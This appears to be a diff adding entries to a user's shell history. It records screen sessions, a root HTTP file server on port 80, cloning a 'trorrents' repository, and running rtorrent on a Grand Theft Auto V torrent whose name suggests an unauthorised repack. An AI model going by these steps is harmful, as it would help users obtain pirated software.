+ps x 
+screen -r
+sudo python3 -m http.server 80
+df -h
+git clone https://github.com/DukeOfKeys/trorrents.git
+ls
+cd trorrents/
+ls
+rtorrent Grand-Theft-Auto-V-by-Igruha.torrent 
+screen 
+screen -l
+
